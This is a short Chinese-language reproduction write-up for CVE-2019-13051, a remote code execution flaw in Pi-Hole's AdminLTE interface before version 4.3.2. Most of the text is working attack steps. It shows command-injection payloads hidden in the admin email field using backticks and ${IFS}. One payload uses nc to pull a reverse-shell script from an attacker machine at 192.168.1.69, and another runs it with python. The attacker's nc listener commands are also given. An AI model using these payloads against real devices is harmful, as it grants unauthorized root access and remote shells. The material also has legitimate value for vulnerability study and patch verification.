（CVE-2019-13051）Pi-Hole 远程代码执行漏洞
==========================================

一、漏洞简介
------------

通过描述的"AdminLTE"组件上的漏洞，可以远程获得RaspberyPi设备（或应用程序正在运行的任何设备/VM）上的根访问权限。要利用此漏洞，需要对AdminLTE
web界面的管理访问权限凭据。

二、漏洞影响
------------

Pi-Hole \< 4.3.2

三、复现过程
------------

在管理员邮箱处添加

    "`test>/tmp/poc_proof.txt`"@0-sec.org

![1.png](./resource/(CVE-2019-13051)Pi-Hole远程代码执行漏洞/media/rId24.png)

由于该系统设定原因，需等待十分钟后，即可发现`/tmp/poc_proof.txt`
已经被创建

![2.jpg](./resource/(CVE-2019-13051)Pi-Hole远程代码执行漏洞/media/rId25.jpg)

### 深入利用

现在攻击机上执行反弹shell命令

    nc -nvlp 4444 < revshell.py

在管理邮箱处执行反弹shell代码

    "`nc${IFS}192.168.1.69${IFS}4444>/tmp/revshell.py`"@0-sec.org

![3.png](./resource/(CVE-2019-13051)Pi-Hole远程代码执行漏洞/media/rId27.png)

我们可以看到http请求如下所示

![4.png](./resource/(CVE-2019-13051)Pi-Hole远程代码执行漏洞/media/rId28.png)

随后等待十分钟，查看是否执行成功

在确保执行成功后，继续执行nc反弹shell命令

    nc -nvlp 4445

最后，再向网站执行反弹shell命令

    “`python${IFS}/tmp/revshell.py`”@0-sec.org

等待十分钟后，查看回显结果

![5.jpg](./resource/(CVE-2019-13051)Pi-Hole远程代码执行漏洞/media/rId29.jpg)
